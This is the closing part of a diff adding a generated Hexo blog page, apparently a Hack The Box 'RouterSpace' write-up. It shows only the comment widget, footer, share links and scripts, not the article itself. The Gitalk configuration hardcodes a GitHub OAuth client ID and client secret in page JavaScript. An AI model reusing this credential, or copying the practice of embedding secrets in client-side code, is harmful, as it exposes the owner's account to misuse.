+        const gitalk = new Gitalk({
+          clientID: 'cf0a9809323df14a9168',
+          clientSecret: 'a30d7a21bf6d88b7ad5c1f5d1bfc45881c49b2ed',
+          repo: 'LucifielHack.github.io',
+          owner: 'LucifielHack',
+          admin: ['LucifielHack'],
+          id: id,      // Ensure uniqueness and length less than 50
+          title: document.title.split('|')[0],
+          distractionFreeMode: false  // Facebook-like distraction free mode
+        })
+
+        gitalk.render('gitalk-container')
+    </script>
+</section>
+
+
+
+
+</article>
+
+
+
+</div>
+
+        <footer class="footer">
+    <div class="top">
+        
+<p>
+    <span id="busuanzi_container_site_uv" style='display:none'>
+        站点总访客数：<span id="busuanzi_value_site_uv"></span>
+    </span>
+    <span id="busuanzi_container_site_pv" style='display:none'>
+        站点总访问量：<span id="busuanzi_value_site_pv"></span>
+    </span>
+</p>
+
+
+        <p>
+            <!--- 
+                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
+            
+            <span>footer.license</span> --->
+        </p>
+    </div>
+    <div class="bottom">
+        <p><span>Lucifiel &copy; 2020 - 2023</span>
+            <span>
+                
+                Power by Lucifiel</a>
+            </span>
+        </p>
+    </div>
+</footer>
+
+    </main>
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.lucifiel.com/2022/03/25/Hackthebox/Hackthebox-RouterSpace/&title=《RouterSpace - Hackthebox》 — Lucifiel's Blog&pic=http://www.lucifiel.com/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.lucifiel.com/2022/03/25/Hackthebox/Hackthebox-RouterSpace/&title=《RouterSpace - Hackthebox》 — Lucifiel's Blog&source=Lucifiel 技术博客" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.lucifiel.com/2022/03/25/Hackthebox/Hackthebox-RouterSpace/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《RouterSpace - Hackthebox》 — Lucifiel's Blog&url=http://www.lucifiel.com/2022/03/25/Hackthebox/Hackthebox-RouterSpace/&via=http://www.lucifiel.com" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.lucifiel.com/2022/03/25/Hackthebox/Hackthebox-RouterSpace/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAN4AAADeCAAAAAB3DOFrAAACsklEQVR42u3aSW4cMRAEQP3/0zZg+CbMdGYVqQWIPg2EXhg8kFRWfXzE159/1+ffn+/J73z/7Oe/v3rbgQsPDw9vNPRXVz7090N8P1nJlL166mEK8PDw8K7x2s0genW8xLdjyLccPDw8vO/lJRvG7Hg92xjw8PDwfi9vswG8fyceHh7eT+YlYcR+UjbDvZ614OHh4cW8TQHsu35/UX0PDw8Pr6yqJ8vuLN5NAojNCP+/AQ8PD+8CL//nf98usAkgNg0NeHh4eGd5efGpbRfIC1rJRLSTi4eHh3ePt2lyahfrYfmqZDzcg4eHh7fm7YtVeQNWGy60R/OXWQseHh7eUd5mCU4A7T15o1Wy/eDh4eHd422i0lOxQvu2orEADw8P7wJv9vl9uas9rM9KdHh4eHhneZvDa9t8kDw1i4wfeiLw8PDwjvLag3UbpLYBxNk4GA8PD+8eL1mIT4WwLWNzlMfDw8P7Gl4eAbQxa3sI3mwMeHh4ePd4s2W6LeS/f/NsE4oCCzw8PLwLvFNLdjKUTcDRNofh4eHh3eblpf3Z8TqH7TeDh3waDw8Pb81ry/lJwJqHFHkrwPCojYeHh3eZNwsLZkfnWYtVfT8eHh7eBd7ZUn1UyB+VstqYAw8PD+8eb9YalQcQmxaEWTNWEeDi4eHhjXhtcatlbILaWQcZHh4e3m3eJmKYFfLzo3OCf5hcPDw8vAu82cPJYj0LF9oNJp9iPDw8vFO8zeDaAHfW1LVpOMDDw8O7wcuvWSwb1d8OHZrzr+Dh4eHtee0huI1f89LXpqlruPvh4eHhLXjtMj3bJPJAod3BHjYGPDw8vB/DywfatljlLV8PX8HDw8P7Vt5s20gO2cnU5CNZ9Yvh4eHhxbw2jDjVqtXC6i/i4eHhXeC1BbC2YH92amZ4PDw8vEO8v4jvsYZiu3HZAAAAAElFTkSuQmCC" alt="微信分享二维码">
+</div>
+
+
+
+
+    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: false };
+
+
+</script>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>
+
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item">
+    <a href="{path}" class="waves-block waves-effect">
+        <div class="title ellipsis" title="{title}">{title}</div>
+        <div class="flex-row flex-middle">
+            <div class="tags ellipsis">
+                {tags}
+            </div>
+            <time class="flex-col time">{date}</time>
+        </div>
+    </a>
+</li>
+</template>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>
+
+
+
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+
+
+
+
+
+</body>
+</html>
